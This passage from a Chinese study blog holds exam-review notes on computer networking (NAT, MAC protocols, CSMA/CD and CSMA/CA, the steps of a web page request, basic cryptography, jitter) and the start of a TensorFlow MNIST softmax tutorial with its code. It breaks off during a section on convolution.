<h2 id="第四章-网络层-数据平面"><a href="#第四章-网络层-数据平面" class="headerlink" title="第四章 网络层-数据平面"></a>第四章 网络层-数据平面</h2><h3 id="掌握网络层协议在协议栈中的位置、提供的服务及主要功能。（4-1）"><a href="#掌握网络层协议在协议栈中的位置、提供的服务及主要功能。（4-1）" class="headerlink" title="掌握网络层协议在协议栈中的位置、提供的服务及主要功能。（4.1）"></a>掌握网络层协议在协议栈中的位置、提供的服务及主要功能。（4.1）</h3><p>略</p>
<h3 id="理解-IPv4-地址-CIDR-表示方式、子网、子网掩码概念。"><a href="#理解-IPv4-地址-CIDR-表示方式、子网、子网掩码概念。" class="headerlink" title="理解 IPv4 地址 CIDR 表示方式、子网、子网掩码概念。"></a>理解 IPv4 地址 CIDR 表示方式、子网、子网掩码概念。</h3><p>子网: 互联若干个主机接口与1个路由器接口的网络形成一个子网(子网也称为IP网络或直接称为网络)<br>子网掩码: 假如IP编址为这个子网分配一个地址223.1.1.0/24, 其中的/24记法, 有时被称为子网掩码, 指示32比特中最左侧24比特定义了子网地址.</p>
<h3 id="能够根据用户对IP地址数量的需求进行网络规划、分配IP地址块"><a href="#能够根据用户对IP地址数量的需求进行网络规划、分配IP地址块" class="headerlink" title="能够根据用户对IP地址数量的需求进行网络规划、分配IP地址块"></a>能够根据用户对IP地址数量的需求进行网络规划、分配IP地址块</h3><p>略</p>
<h3 id="理解网络地址转换-NAT-的动机和工作机制"><a href="#理解网络地址转换-NAT-的动机和工作机制" class="headerlink" title="理解网络地址转换 NAT 的动机和工作机制"></a>理解网络地址转换 NAT 的动机和工作机制</h3><ul>
<li>动机<ul>
<li>只能从ISP申请一个IP地址</li>
<li>IPv4地址耗尽</li>
<li>本地网络设备IP地址的变更，无需通告外界网络</li>
<li>变更ISP时，无需修改内部网络设备IP地址</li>
<li>内部网络设备对外界网络不可见，即不可直接寻址(安全)</li>
</ul>
</li>
<li>工作机制<br>  NAT实现通过利用端口号对内部地址和端口号进行转换，并维护一个转换表。<ul>
<li>替换<br>  利用(NAT IP地址,新端口号)替换每个外出IP数据报的(源IP地址,源端口号)</li>
<li>记录<br>  将每对(NAT IP地址, 新端口号) 与(源IP地址, 源端口号)的替换信息存储到NAT转换表中</li>
<li>替换<br>  根据NAT转换表，利用(源IP地址, 源端口号)替换每个进入内网IP数据报的(目的IP地址,目的端口号)，即(NAT IP地址, 新端口号)</li>
</ul>
</li>
</ul>
<h2 id="第五章-网络层-控制平面"><a href="#第五章-网络层-控制平面" class="headerlink" title="第五章 网络层-控制平面"></a>第五章 网络层-控制平面</h2><h3 id="路由算法和路由表"><a href="#路由算法和路由表" class="headerlink" title="路由算法和路由表"></a>路由算法和路由表</h3><p>OSPF -&gt; Link State -&gt; Dijkstra<br>RIP -&gt; Distance vector -&gt; Bellman-Ford</p>
<h2 id="第六章-数据链路层"><a href="#第六章-数据链路层" class="headerlink" title="第六章 数据链路层"></a>第六章 数据链路层</h2><h3 id="理解链路层的功能"><a href="#理解链路层的功能" class="headerlink" title="理解链路层的功能"></a>理解链路层的功能</h3><p>链路层负责物理相邻节点之间的数据传输</p>
<h3 id="理解多址接入协议（MAC）的功能"><a href="#理解多址接入协议（MAC）的功能" class="headerlink" title="理解多址接入协议（MAC）的功能"></a>理解多址接入协议（MAC）的功能</h3><p>针对共享传输介质来协调节点对信道的使用</p>
<h3 id="了解MAC协议按工作方式进行分类"><a href="#了解MAC协议按工作方式进行分类" class="headerlink" title="了解MAC协议按工作方式进行分类"></a>了解MAC协议按工作方式进行分类</h3><ul>
<li><p>信道划分（channel partitioning）协议<br>  在所有共享信道节点之间划分广播信道带宽的技术.</p>
<ul>
<li>时分多路复用(TDM)<br>  TDM将时间划分为时间帧(time frame), 并进一步划分每个时间帧为N个时隙(slot), 然后把每个时隙分配给N个节点中的一隔. 无论何时某个及节点在有分组要发送的时候, 它在循环的TDM帧中指派给它的时隙内传送分组比特.</li>
<li>频分多路复用(FDM)<br>  FDM将R bps信道划分为不同的频段(每个频段具有R/N带宽), 并把每个频率分配给N个节点中的一个. 因此FDM在单个较大的R bps信道中创建了N个较小的R/N bps信道.</li>
<li>码分多址(CDMA)<br>  CDMA对每个节点分配一种不同的编码, 然后每个节点用它唯一的编码来对它发送的数据进行编码.</li>
</ul>
</li>
<li><p>随机接入（random access）<br>  在随机介入协议中, 一个传输节点总是以信道的全部速率(即R bps)进行发送, 当有碰撞时, 涉及碰撞的每个节点反复重发它的帧, 到该帧无碰撞地通过为止, 但是当一个节点经历一次碰撞时, 它在重发该帧之前等待一个随机时延.</p>
<ul>
<li>ALOHA<br>  当一帧首次到达, 节点立刻将该帧完整的传输进广播信道, 如果一个传输的帧与一个或多个传输经历了碰撞, 这个节点将立刻以概率p重传该帧, 否则, 该节点等待一个帧传输时间, 在此等待之后, 它则以概率p传输该帧, 或者以概率1-p在另一个帧时间等待.</li>
<li>时隙 ALOHA<ol>
<li>当节点有一个新帧要发送时, 它等到下一个时隙开始并在该时隙传输整个帧.</li>
<li>如果没有碰撞, 该节点成功的传输它的帧, 从而不需要考虑重传该帧.</li>
<li>如果有碰撞, 该节点在时隙结束之前检测到这次碰撞, 该节点以概率p在后续的每个时隙中重传它的帧, 知道该帧被无碰撞地传输出去.</li>
</ol>
</li>
<li>CSMA/CD(Carrier Sense Multiple Access with collision detection)<ol>
<li>准备好链路层帧后, 将其放入发送缓存中.</li>
<li>如果侦听到信道空闲, 开始传播帧, 如果侦听到信道正在忙, 就等待到信道空闲时才开始传播帧.</li>
<li>在传播过程中, 保持检测是否存在来自其他设备的使用该广播信道的信号.</li>
<li>如果未检测到其他设备的信号, 那么传输完成; 如果在传播时检测到了其他设备的信号就中止传输.</li>
<li>中止传播后, 等待一个随机时间量, 然后返回步骤2. 假设随机时间量为 t, 如果采用二进制指数后退算法, 那么从区间 $ [0, 1, … , 2^n - 1] $中选择一个 K 值, n 为该帧经历的碰撞次数, $t = K\times t_0, \ \ t_0$是发送512比特进入以太网所需要的时间.</li>
</ol>
  <strong>载波侦听后要冲突探测的原因</strong>: 在多路访问协议中加入碰撞检测, 通过不传输一个无用的损坏的帧, 将有助于改善协议的性能.</li>
</ul>
</li>
<li><p>轮流协议（taking turns）</p>
<ul>
<li>轮询协议<br>  轮询协议要求多路访问的节点之一要被指定为主节点, 主节点以循环的方式轮询每个节点</li>
<li>令牌传递协议<br>  在这种协议中没有主节点, 一个称为令牌的小的特殊帧在节点之间以某种固定的次序进行交换. </li>
</ul>
</li>
</ul>
<h3 id="掌握-ARP-的工作机制，理解教材图-6-19-Two-subnets-interconnected-by-a-router-的例子，要能独自分析数据包的传输过程。"><a href="#掌握-ARP-的工作机制，理解教材图-6-19-Two-subnets-interconnected-by-a-router-的例子，要能独自分析数据包的传输过程。" class="headerlink" title="掌握 ARP 的工作机制，理解教材图 6.19 Two subnets interconnected by a router 的例子，要能独自分析数据包的传输过程。"></a>掌握 ARP 的工作机制，理解教材图 6.19 Two subnets interconnected by a router 的例子，要能独自分析数据包的传输过程。</h3><p>略</p>
<h3 id="交换机自学习"><a href="#交换机自学习" class="headerlink" title="交换机自学习"></a>交换机自学习</h3><ul>
<li>交换机表初始为空</li>
<li>对于在每个接口接收到的每个入帧, 交换机在表中存储: <ol>
<li>在该帧<strong>源地址</strong>字段中的<strong>MAC地址</strong></li>
<li>该帧到达的接口</li>
<li>当前时间</li>
</ol>
</li>
<li>如果在一段时间(老化期 aging time)后, 交换机没有接收到以该地址作为源地址的帧, 就在表中删除这个地址.</li>
</ul>
<h3 id="深刻理解教材-6-7-节"><a href="#深刻理解教材-6-7-节" class="headerlink" title="深刻理解教材 6.7 节"></a>深刻理解教材 6.7 节</h3><p>Web 页面请求的历程(简略过程总结): (以<a href="http://www.google.com为例" target="_blank" rel="noopener">www.google.com为例</a>)</p>
<ul>
<li>准备: DHCP, UDP, IP和以太网</li>
</ul>
<ol>
<li>主机准备使用DHCP协议获取IP地址和其它相关信息. 依次封装DHCP报文, UDP报文段和IP数据报中.</li>
<li>将IP数据报放置于以太网帧中并广播给所有与交换机相连的设备中.</li>
<li>以太网帧到达交换机, (假设此帧是交换机接收到的第一个以太网帧)交换机在所有的出端口广播该入帧.</li>
<li>路由器(运行着DHCP服务器)接收到了该以太网帧, 分解帧递交至DHCP服务器.</li>
<li>DHCP服务器做出响应, 将DHCP ACK报文依次封装到UDP报文, IP数据报, 以太网帧中并发送</li>
<li>帧到达交换机并被转发</li>
<li>主机接收到帧, 更新自身IP地址, 子网掩码, DNS服务器IP和默认网关地址. </li>
</ol>
<ul>
<li>仍在准备: DNS和ARP</li>
</ul>
<ol>
<li>(由于还不知道google的ip地址) 主机的操作系统生成一个DNS查询报文并被封装到UDP报文段中, <strong>目的端口为 53</strong>. </li>
<li>(由于还不知道默认网关的MAC地址) 主机将使用ARP协议.</li>
<li>将ARP查询报文封装到以太网帧中, 发送给所有与交换机相连的设备中.</li>
<li>默认网关路由器接收到该帧, 准备好<strong>ARP回答</strong>并置于以太网帧(目的地址设置为主机的MAC地址而不是广播)中, 经过交换机的转发递交给主机 </li>
<li>主机从ARP回答中抽取网关的MAC地址</li>
<li>主机的含有DNS查询报文的以太网帧能够寻址到网关路由器</li>
</ol>
<ul>
<li>仍在准备: 域内路由选择到DNS服务器</li>
</ul>
<ol>
<li>路由器根据OSPF, rip, BGP等协议生成转发表, 通过转发表确定路由将DNS查询报文发送到DNS服务器.</li>
<li>DNS服务器在DNS数据库中找到<a href="http://www.google.com的DNS源记录(来源于权威DNS服务器)" target="_blank" rel="noopener">www.google.com的DNS源记录(来源于权威DNS服务器)</a>, DNS服务器生成对应的DNS回答报文并封装到UDP报文段中, 最后数据报被发送到主机中.</li>
<li>主机获取<a href="http://www.google.com的IP地址" target="_blank" rel="noopener">www.google.com的IP地址</a>.</li>
</ol>
<ul>
<li>Web 客户-服务器交互: TCP 和 HTTP</li>
</ul>
<ol>
<li>主机建立TCP套接字, 尝试和服务器进行连接, 所以首先进行三次握手(过程略, 见上面图)</li>
<li>完成三次握手后, 借助套接字发送GET请求报文, 依次封装HTTP报文, TCP报文段, IP数据报. 发送至google服务器.</li>
<li>google服务器收到GET请求报文, 生成含有Web页面内容的响应报文, 发送至主机</li>
<li>主机收到响应报文, 从中抽取Web网页的html, 浏览器显示了Web页面.</li>
</ol>
<h2 id="第七章-无线和移动网络"><a href="#第七章-无线和移动网络" class="headerlink" title="第七章 无线和移动网络"></a>第七章 无线和移动网络</h2><h3 id="能够掌握-CSMA-CA-协议的基本工作原理。（7-3-1，7-3-2）"><a href="#能够掌握-CSMA-CA-协议的基本工作原理。（7-3-1，7-3-2）" class="headerlink" title="能够掌握 CSMA/CA 协议的基本工作原理。（7.3.1，7.3.2）"></a>能够掌握 CSMA/CA 协议的基本工作原理。（7.3.1，7.3.2）</h3><p>CSMA/CA, CSMA with collision avoidance, 带碰撞<strong>避免</strong>的CSMA.</p>
<ul>
<li>链路层确认:<br>  目的站点收到一个通过CRC校验的帧后, 它等待一个短帧间间隔的一小段时间, 然后发挥一个确认帧. 如果发送站点在给定的时间内未收到确认帧, 它假定出现了错误并重传该帧, 使用CSMA/CA协议访问该信道. 如果在若干固定次重传后仍未收到确认, 发送站点将放弃发送并丢弃该帧.</li>
<li>CSMA/CA:<br>  假设一个站点有一个帧要发送.<ol>
<li>如果监听到信道空闲, 它将在一个分布式帧间间隔的短时间段后发送该帧.</li>
<li>否则, 选取一个随机回退值, 并且在侦听信道空闲时递减该值. 当侦听到信道忙时, 计数值保持不变.</li>
<li>当计数值减为 0 时, 该站点发送整个数据帧并等待确认.</li>
<li>如果收到确认(说明帧被正确接收了). 如果还要发送另一帧, 将从第二步开始CSMA/CA, 如果未收到确认, 就重新进入第二步中的回退阶段, 并从一个更大的范围内选取随机值.</li>
</ol>
</li>
</ul>
<h3 id="能够深入理解隐藏终端（hidden-terminal）问题和其解决方法。（7-3-2）"><a href="#能够深入理解隐藏终端（hidden-terminal）问题和其解决方法。（7-3-2）" class="headerlink" title="能够深入理解隐藏终端（hidden terminal）问题和其解决方法。（7.3.2）"></a>能够深入理解隐藏终端（hidden terminal）问题和其解决方法。（7.3.2）</h3><p>解决方法: RTS(Request to Send, RTS)和CTS(Clear to Send, CTS)<br>当发送方要发送一个DATA时, 首先向AP(access point)发送一个RTS帧, 指示传输DATA帧和确认(ACK)帧需要的总时间. 当AP收到RTS帧后, 它广播一个CTS帧作为响应. 该CTS帧有两个目的: 给发送方明确的发送许可, 也指示其它站点在预约期内不要发送.</p>
<h2 id="第八章-网络安全"><a href="#第八章-网络安全" class="headerlink" title="第八章 网络安全"></a>第八章 网络安全</h2><h3 id="了解网络安全和数据加密的基本概念，对称密钥和公开密钥的基本原理和性质"><a href="#了解网络安全和数据加密的基本概念，对称密钥和公开密钥的基本原理和性质" class="headerlink" title="了解网络安全和数据加密的基本概念，对称密钥和公开密钥的基本原理和性质"></a>了解网络安全和数据加密的基本概念，对称密钥和公开密钥的基本原理和性质</h3><ul>
<li><p>安全通信具有的特征</p>
<ul>
<li>机密性: 仅有发送方和希望的接收方能够理解传输报文的内容. – 数据加密和解密的密码学技术.</li>
<li>报文完整性: 确保其通信的内容在传输过程中未被改变, 包括恶意篡改或者意外改动. – 检验和技术在扩展后可用于提供这种报文完整性</li>
<li>端点鉴别: 发送方和接受方都应该能证实通信过程所涉及的另一方, 以确信通信的另一方确实具有其所声称的身份. – 端点鉴别技术</li>
<li>运行安全性: 反制对机构网络的攻击 – 防火墙和入侵检测系统等运行设备.</li>
</ul>
</li>
<li><p>对称密钥系统</p>
<ul>
<li>通信双方的密钥是相同且秘密的.</li>
<li>这种方法的一个困难是双方必须就共享密钥达成一致, 但是这样做的前提是需要<strong>安全通信</strong>.</li>
</ul>
</li>
<li><p>公开密钥系统: </p>
<ul>
<li>使用一对密钥: 一个密钥为通信双方(实际上为全世界)所知, 另一个密钥只有通信双方中的一个所知(而不是双方都知道)</li>
<li>双方能够在没有预先商定的共享密钥的条件下进行加密通信</li>
</ul>
</li>
<li><p>hash函数: 找到任意两个不同的报文 x 和 y 使得H(x) = H(y), 在计算上是不可能的.</p>
</li>
<li><p>报文鉴别码(Message Authentication Code, MAC): </p>
<ul>
<li>通信双方需要共享秘密 s (鉴别密钥, authentication key). </li>
<li>假设报文内容为 m, 报文鉴别码为 H(m+s).</li>
</ul>
</li>
<li><p>数字签名:</p>
<ul>
<li>报文发送方产生公钥和密钥.</li>
<li>报文内容为 m, 计算报文散列 h = H(m)</li>
<li>发送方用私钥$K_B^-$计算$K_B^-(h)$, 即数字签名, 将完整报文连同数字签名一同发送.</li>
<li>接收方拆分长报文m 和数字签名k. 计算 H(m) 和 $K_B^+(k)$, 如果二者相同说明报文具有消息完整性.</li>
</ul>
</li>
</ul>
<h2 id="第九章-多媒体网络"><a href="#第九章-多媒体网络" class="headerlink" title="第九章 多媒体网络"></a>第九章 多媒体网络</h2><h3 id="延迟抖动"><a href="#延迟抖动" class="headerlink" title="延迟抖动"></a>延迟抖动</h3><ul>
<li><p>产生原因:<br>  分组在网络路由器中经历的变化的排队时延使得在源中产生分组到它在接收方收到的这段时间, 对于不同的分组可能会有波动.</p>
</li>
<li><p>解决方法: </p>
<ul>
<li>固定播放时延:<br>  假设块在时刻t被产生出来, 那么接收方会在t+q(常量)时刻播放这个块.</li>
<li>适应性播放时延:<br>  假设:<br>  $t_i = 该分组产生的时间$<br>  $r_i = 分组i被接收的时间$<br>  $p_i = 分组i被播放的时间$<br>  那么第i个分组被接收时的<strong>平均网络时延的估计值</strong>为:<br>  $d_i = (1-u)d_{i-1} + u(r_i - t_i)$<br>  另vi为平均网络时延的估计值与实际时延的偏差的估计值<br>  $v_i = (1-u)v_{i-1}+u|r_i-t_i-d_i|$<br>  那么分组的播放时间为:<br>  $p_i = t_i + d_i + Kv_i$</li>
</ul>
</li>
</ul>
<h3 id="分组丢包"><a href="#分组丢包" class="headerlink" title="分组丢包"></a>分组丢包</h3><p>两种解决技术: 向前纠错(Forward Error Correction, FEC)和交织(interleaving)</p>
<ul>
<li><p>向前纠错:</p>
<ol>
<li>给初始的分组流增加冗余信息. 增加播放时延, 且组的长度越小, 相对增加的传输速率就越大</li>
<li>发送一个较低分辨率的音频流作为冗余信息. 增加的时延较小, 如果低分辨率编码比标称编码少得多, 那么传输速率的额外增加并不大</li>
</ol>
</li>
<li><p>交织:<br>  发送发在传输之前对音频数据单元重新排序, 使的最初相邻的单元在传输流中以一定距离分离开来.<br>  优点: 不增加流的带宽需求<br>  缺点: 增加了时延.</p>
</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[深度学习入门]]></title>
      <url>/2019/10/30/MNIST/</url>
      <content type="html"><![CDATA[<a id="more"></a>

<h1 id="MNIST-机器学习入门"><a href="#MNIST-机器学习入门" class="headerlink" title="MNIST 机器学习入门"></a>MNIST 机器学习入门</h1><p>主要参考 : <a href="http://www.tensorfly.cn/tfdoc/tutorials/mnist_beginners.html" target="_blank" rel="noopener">tensorflow 中文社区</a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>MNIST是一个入门级的计算机视觉数据集，它包含各种手写数字图片:</p>
<figure class="image-box">
                <img src="http://www.tensorfly.cn/tfdoc/images/MNIST.png" alt title class>
                <p></p>
            </figure>

<p>在此教程中，我们将训练一个机器学习模型用于预测图片里面的数字.</p>
<h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><p>数据集的下载和安装本来可以用 tensorflow 社区提供的一份python代码来完成. 可惜链接是指向google 的网盘的, 我手上暂时也没可用的梯子, 只好百度了一份 <code>input_data.py</code>, 然而这份代码年代已经十分久远, 已经不适合现在版本的numpy了, 所以我又只能下载安装一份旧的numpy <code>pip install numpy==1.16.0</code>. But 又因为在国内连接<code>pypi</code>也十分的慢, socket会报 <code>time out</code> 错误, 我又只能换了下<code>douban</code>的镜像<code>pip install redis -i https://pypi.douban.com/simple</code>. 这下才算解决了数据集的问题(苦笑).</p>
<p>在使用中, 需要把<code>input_data.py</code>先<code>import</code>进 python 的主程序中, 如果数据集没有被提前下载, 那么在运行时会调用<code>input_data</code>中的函数下载数据集. 建议先提前下载好数据集放置在固定的目录下, 可以避免运行时下载速度太慢的问题.</p>
<p>实际使用中的数据集会被分为两部分, 60000行的训练数据集(mnist.train)和10000行的测试数据集(mnist.test). 有了这个单独用来测试而不会用于训练的数据集会使模型更容易推广到其他数据集上(泛化).</p>
<p>而每一组数据单元包含一个手写图片和一个对应的标签的数据. 所有图片的数据可以由一个形状为<code>[60000, 784]</code>的张量来表示, 第一个维度当做图片的索引. 所有标签的数据用张量<code>[60000,10]</code>来表示. 且此处的10维向量是独热的, 代表 0 - 9 十种可能.</p>
<h2 id="softmax回归"><a href="#softmax回归" class="headerlink" title="softmax回归"></a>softmax回归</h2><p>目标: 求得每个像素对于特定数字类的权值, 即得到一张给定图片属于某个特定数字类的证据(evidence), 证据值越大, 证明越有可能是这个数字类. </p>
<p>对于给定的输入图片 x 它代表的是数字 i 的证据可以表示为:<br>$$<br>evidence_i = \sum_j W_{i,j} + b_i<br>$$<br>其中$W_i$ 代表权重, $b_i$代表数字 i 类的偏置量, j 代表给定图片 x 的像素索引用于像素求和. 然后用softmax函数可以把这些证据转换成概率 y:<br>$$y = softmax(evidence)$$</p>
<p>可以看成是一个激励(activation)函数, 把我们定义的线性函数的输出转换成我们想要的格式, 也就是关于10个数字类的概率分布.</p>
<p>$$<br>\begin{aligned}<br>softmax(x) &amp;= normalize(exp(x)) \<br>softmax(x)_i &amp;= \cfrac{exp(x_i)}{\Sigma_jexp(x_j)}<br>\end{aligned}<br>$$</p>
<p>此处的<code>normalize()</code>为归一化, 归一化就是要把需要处理的数据经过处理后(通过某种算法)限制在你需要的一定范围内, 可以方便后面数据处理的方便, 其次是保证程序运行时的概率分布.</p>
<p>回归模型可以用下面的图解释:</p>
<figure class="image-box">
                <img src="http://www.tensorfly.cn/tfdoc/images/softmax-regression-scalargraph.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="http://www.tensorfly.cn/tfdoc/images/softmax-regression-scalarequation.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="http://www.tensorfly.cn/tfdoc/images/softmax-regression-vectorequation.png" alt title class>
                <p></p>
            </figure>

<p>第三张图的 W 矩阵即为权重值矩阵. 此处矩阵相乘的形式与下面 tf 的代码十分相似.</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/dachuang/matrix1.png" alt title class>
                <p></p>
            </figure>
<p>这里公式其实是单就一张图片而言. x1,x2,x3代表了 x 的第 1,2,3 个像素. 将矩阵乘法展开后就成了加权求和的形式. 不过在实际中, 图片是有 784 个像素的, 输出的向量元素个数也应该为10, 所以严格来说公式应该是这个样子.</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/dachuang/matrix2.png" alt title class>
                <p></p>
            </figure>
<p>目前为止这个模型的思想似乎很清晰了, 但是 <code>softmax 回归</code> 在这里究竟是什么作用还是有些不明朗, 不过我大致猜测其实 softmax 与模型参数 W 和 b 的确定并没有太大的关系, 它在这里主要的作用是将计算结果映射到 [0,1] 的区间上, 使结果作为概率值是有意义的. 在神经网络上, softmax 也是作用在最后一层. 综上, softmax 的作用是对模型输出的一层 “约束”.</p>
<h2 id="模型设定"><a href="#模型设定" class="headerlink" title="模型设定"></a>模型设定</h2><p>我所理解的模型设定这部分就是使用 tensorflow 的语言描述出数学模型的公式的过程. 这里所需要描述的公式如上图所示.</p>
<p>根据公式, 我们在代码中需要实现的有 tensorflow变量 x 和 y分别用来存储输入的数据和模型输出的数据, 并且还有 权重矩阵W 和 偏置量b.<br>还需要在程序中设定好使用的模型为 <code>softmax 回归</code>.</p>
<h2 id="训练模型"><a href="#训练模型" class="headerlink" title="训练模型"></a>训练模型</h2><p>交叉熵(cross-entropy)成本函数.<br>$$<br>H_{y’}(y) = -\sum_i y^{‘}_ilog(y_i)<br>$$<br>其中 y 是预测的概率分布, y’ 是实际的分布(输入的 one-hot vector, 这里输入为独热的向量也是为了和模型的输出的形式相同.).</p>
<p>交叉熵代表了模型计算结果中的损失(loss), 也就是说交叉熵越大, 那么计算结果的误差也就越大.</p>
<p>代码中要求TensorFlow用梯度下降算法以 0.01 的学习速率最小化交叉熵. 使用随机梯度的下降训练的意义在于, 在每一步训练时不使用所有的数据, 而是选取其中的子集来节省计算的开销. 在每一步的计算中, tensorflow 会自动使用反向传播算法(backpropagation algorithm)来不断降低 loss 的值. 我在网上找到了反向传播算法的介绍, 其原理大致为 : 当输入的数据集相同时, 损失函数的值 C 可以看做是关于 权重矩阵W 和 偏置量b 的二元函数. 也就是 $C = f(W,b)$, 当 C 的值最小时, 周围的函数是平滑的(也有不是的情况), 也就相当于偏导数为 0.<br>$$<br>\begin{aligned}<br>&amp;\cfrac{\partial C}{\partial W} = 0 \<br>&amp;\cfrac{\partial C}{\partial b} = 0<br>\end{aligned}<br>$$<br>经过多轮迭代使参数 W 和 b 达到接近这样的状态时, 梯度下降的一步就完成了. 但是具体每步的步长是多少要根据学习速率和步长来计算.</p>
<h2 id="模型评估"><a href="#模型评估" class="headerlink" title="模型评估"></a>模型评估</h2><p>模型评估的方法比较简单, 就是用 minst.test 中的数据, 将图片的数据输入到训练好的模型中, 然后调用 tf 中的函数与标签中的结果进行比对算出正确率. 这里的 test 数据应该与 train 中的数据不能有重合.</p>
<h2 id="完整代码和我的注释"><a href="#完整代码和我的注释" class="headerlink" title="完整代码和我的注释"></a>完整代码和我的注释</h2><p>input_data.py 可以在百度上搜到, 就不贴在这里了.</p>
<p>MNIST.py</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> input_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用 input_data.py 中的代码导入需要的数据集</span></span><br><span class="line">mnist = input_data.read_data_sets(<span class="string">"MNIST_data/"</span>, one_hot=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">###  模型构建  ####</span></span><br><span class="line">x = tf.placeholder(<span class="string">"float"</span>, [<span class="literal">None</span>, <span class="number">784</span>])</span><br><span class="line">W = tf.Variable(tf.zeros([<span class="number">784</span>,<span class="number">10</span>])) <span class="comment"># W 权重矩阵</span></span><br><span class="line">b = tf.Variable(tf.zeros([<span class="number">10</span>]))     <span class="comment"># b 偏置量</span></span><br><span class="line">y = tf.nn.softmax(tf.matmul(x,W)+b) <span class="comment"># y 输出值, 同时指出了模型为 softmax</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 训练模型以及评估 ####</span></span><br><span class="line">y_ = tf.placeholder(<span class="string">"float"</span>,[<span class="literal">None</span>,<span class="number">10</span>])         <span class="comment"># y_</span></span><br><span class="line">cross_entropy = -tf.reduce_sum(y_*tf.log(y))   <span class="comment"># 交叉熵, 符合上面的交叉熵公式 </span></span><br><span class="line">train_step = tf.train.GradientDescentOptimizer(<span class="number">0.01</span>).minimize(cross_entropy) <span class="comment"># 使用随机梯度下降算法最小化交叉熵</span></span><br><span class="line">init = tf.global_variables_initializer()</span><br><span class="line">sess = tf.Session()  <span class="comment"># sess 为 session, tf 中一切 Variable 的操作都需要用session 来控制</span></span><br><span class="line">sess.run(init)       <span class="comment"># 初始化后所有的 Variable 才能使用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">  <span class="comment"># 随机抓取 100 组数据作为一次训练的数据集. 再迭代训练 1000 次, 这样会利用上100_000组数据</span></span><br><span class="line">  batch_xs, batch_ys = mnist.train.next_batch(<span class="number">100</span>) </span><br><span class="line">  sess.run(train_step, feed_dict=&#123;x: batch_xs, y_: batch_ys&#125;)</span><br><span class="line"></span><br><span class="line">correct_prediction = tf.equal(tf.argmax(y,<span class="number">1</span>), tf.argmax(y_,<span class="number">1</span>)) <span class="comment"># 返回一组boolean值代表正确的预测</span></span><br><span class="line">accuracy = tf.reduce_mean(tf.cast(correct_prediction, <span class="string">"float"</span>)) <span class="comment"># 将boolean值转为百分率</span></span><br><span class="line">print(sess.run(accuracy, feed_dict=&#123;x: mnist.test.images, y_: mnist.test.labels&#125;)) <span class="comment"># 输出正确率</span></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个 MNIST 的项目是 tensorflow中文社区 介绍的深度学习领域中的 “Hellowrold”, 用来练手应该是非常合适的, 这也是我第一次使用tensorflow. 被它的强大所震撼.(上面的代码样例实际运行时间不会超过 3 秒钟). 而且这个项目代表了机器学习中一个十分经典的问题 – 多分类问题. </p>
<p>当读懂了教程后, 会发现整个项目的构建思路其实是无比清晰的, 从问题的数据集的数学表示, 到设计数学模型描述实际问题中数据的关系, 再到将数学模型用代码实现已经选择训练模型的策略和评估方法, 在思路上十分顺畅. 这种设计思路我觉得对将来我自己的项目十分有借鉴意义. 只可惜我的数学底子在浩瀚的数学公式面前显得实在是微不足道, 无法深入的探究数学公式的原理. 在这里立个flag, 寒假在学习深度学习和tensorflow时也要尽最大努力补充数学和概率论的知识, 只有这样才能从更底层的角度深入的理解深度学习.</p>
<h1 id="MINST-改进"><a href="#MINST-改进" class="headerlink" title="MINST 改进"></a>MINST 改进</h1><p>上面的MINST例子有91%的正确率, 下面将使用卷积神经网络来改善效果.</p>
<h2 id="卷积"><a href="#卷积" class="headerlink" title="卷积"></a>卷积</h2><p>卷积网络(也叫做卷积神经网络), 是指那些至少在网络的一层中使用卷积运算来代替一般的矩阵乘法运算的神经网络. 卷积是一种特殊的线性运算. 卷积网络是一种专门用来处理具有类似网络结构的数据的神经网络, 例如时间序列数据和二维的像素网络. </p>
<p>假设 x(t) 是某传感器传来的测量结果.<br>采用一个有效的概率密度函数(也算是一种加权函数)$W(a)$, a 表示距离某个特定自变量的距离大小, 对自变量的定义域的任意值均采用这种加权平均的操作, 就有<br>$$s(t) = \int x(a)w(t-a)da$$<br>这里 a 是当前时刻t之前的某个时刻. x 是输入(input), 第二个参数 w 叫做核函数. 输出有时被称作特征映射. 这种运算就叫做卷积. 用星号表示:<br>$$s(t) = (x * w)(t)$$<br>对于离散数据的二维卷积运算, 上述积分可以简化为<br>$$S(i,j)=(I * K)(i,j)=\sum_m \sum_nI(m,n)K(i-m,j-n)$$<br>因为卷积是可交换(翻转)的, 所以等价于<br>$$S(i,j)=(K * I)(i,j)=\sum_m \sum_nI(i-m,j-n)K(m,n)$$<br>许多神经网络库会实现一个相关的函数, 称为互相关函数, 和卷积运算一样但是没有对核翻转.<br>$$S(i,j)=(I*K)(i,j)=\sum_m\sum_nI(i+m,j+n)K(m,n)$$<br>下面是个 2 维卷积的例子.</p>
<figure class="image-box">
